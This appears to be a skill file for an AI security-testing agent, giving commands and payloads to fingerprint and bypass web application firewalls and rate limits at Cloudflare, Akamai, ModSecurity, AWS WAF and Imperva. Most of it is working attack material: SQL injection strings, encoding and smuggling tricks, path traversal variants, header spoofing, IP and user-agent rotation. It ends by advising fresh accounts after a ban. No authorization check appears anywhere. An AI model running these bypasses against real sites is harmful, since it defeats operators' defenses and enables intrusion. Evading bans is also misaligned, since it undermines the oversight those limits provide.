---
name: waf-bypass
description: WAF detection, fingerprinting, and bypass techniques for Cloudflare, Akamai, ModSecurity, AWS WAF, Imperva, and generic rate-limiters. Use when testing is blocked by 403/429 responses, when WAF headers are detected, or before starting any active testing against a protected target.
---

# WAF Detection & Bypass

## Detection Phase (always run first)

### Automated WAF fingerprinting
```bash
wafw00f -a https://TARGET.COM 2>&1 | tee tmp/waf-detect.txt
```

### Manual header analysis
```bash
curl -sI https://TARGET.COM | grep -iE "cf-|akamai|incapsula|cloudfront|x-cdn|x-sucuri|server: cloudflare|x-powered-by: arachni|mod_security|x-akamai|via:"
```

### Rate limit detection
```bash
for i in $(seq 1 30); do
  code=$(curl -s -o /dev/null -w "%{http_code}" -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" https://TARGET.COM/)
  echo "$i: $code"
  [ "$code" = "429" ] && echo "RATE LIMITED at request $i" && break
  sleep 0.5
done
```

### Response anomaly detection
```bash
# Check if responses change with suspicious payloads
curl -s -o /dev/null -w "%{http_code} %{time_total}s %{size_download}b\n" "https://TARGET.COM/?id=1' OR 1=1--"
curl -s -o /dev/null -w "%{http_code} %{time_total}s %{size_download}b\n" "https://TARGET.COM/?id=1"
# Diff in size/time = WAF is filtering
```

## Bypass by WAF Type

### Cloudflare
```
# Direct IP discovery
dig TARGET.COM +short
# Historical IPs (bypass CDN)
curl -s "https://dns.google/resolve?name=TARGET.COM&type=A" | jq -r '.Answer[].data'
# SecurityTrails / ViewDNS for historical IPs

# HTTP/2 smuggling
h2c smuggling via curl --http2-prior-knowledge

# Unicode normalization
// = %c0%af or %e0%80%af
/ = %c0%af, %c1%9c, %e0%80%af

# Chunked encoding bypass
Transfer-Encoding: chunked
0

GET /admin HTTP/1.1
Host: TARGET.COM
```

### Akamai
```
# Path manipulation
/..;/admin
/%2e./admin
/./admin/..%00/
/admin%20
/admin%09
/admin?

# Case variation
/Admin, /ADMIN, /aDmIn

# HTTP parameter pollution
?id=1&id=2  (backend may see different value than WAF)

# Method override
X-HTTP-Method-Override: DELETE
X-Method-Override: DELETE
```

### ModSecurity / OWASP CRS
```
# Double URL encoding
%2527 = %27 = '
%253B = %3B = ;

# Unicode encoding
\u0027 = '
\u003b = ;

# Comment injection
UN/**/ION SEL/**/ECT 1,2,3
SEL/**/ECT/**/name/**/FROM/**/users

# Boundary confusion
' || '1'='1
'%20||%20'1'='1

# Case bypass
SeLeCt, InSeRt, UpDaTe, DeLeTe
```

### AWS WAF
```
# IP rotation (AWS WAF has per-IP limits)
# Use VPN/proxy rotation

# Request fragmentation
GET /ad HTTP/1.1
Host: TARGET.COM
GET /min HTTP/1.1
Host: TARGET.COM

# JSON parameter pollution
{"id": "1 AND 1=1", "name": "test"}
{"id": "1", "name": "test"}

# URI encoding bypass
/admin%2f → /admin/
/admin%252f → /admin/
```

### Imperva / Incapsula
```
# Cookie-based bypass
# Capture the incap_ses cookie from a valid request
# Reuse it in subsequent requests

# IP-based (if behind VPN/proxy)
# Incapsula checks X-Forwarded-For
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 8.8.8.8

# Timing bypass
# Some Imperva rules have different timeouts
# Slow requests may bypass certain checks
```

## Generic Rate-Limit Bypass
```
# Slow and low
sleep 5-10 between requests

# Session-based limiting
# Get a valid session cookie first, then test with it
# Many WAFs limit by IP + session, not just IP

# Rotate User-Agents
UA_LIST=("Mozilla/5.0 (Windows NT 10.0; Win64; x64)" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)" "Mozilla/5.0 (X11; Linux x86_64)")
UA=${UA_LIST[$((RANDOM % ${#UA_LIST[@]}))]}

# Use different HTTP/2 settings
# Some WAFs treat HTTP/1.1 and HTTP/2 differently
curl --http2 https://TARGET.COM/...

# Path variation
/robots.txt, /sitemap.xml, /.well-known/security.txt (often not WAF-protected)
```

## When to Stop Fighting the WAF
1. 5 different bypass attempts all blocked → move to passive recon
2. IP banned for > 1 hour → note WAF type, switch to API/passive testing
3. Account banned → @accounts for fresh identity
4. The WAF protects everything uniformly → escalate to @intel for specific bypass research
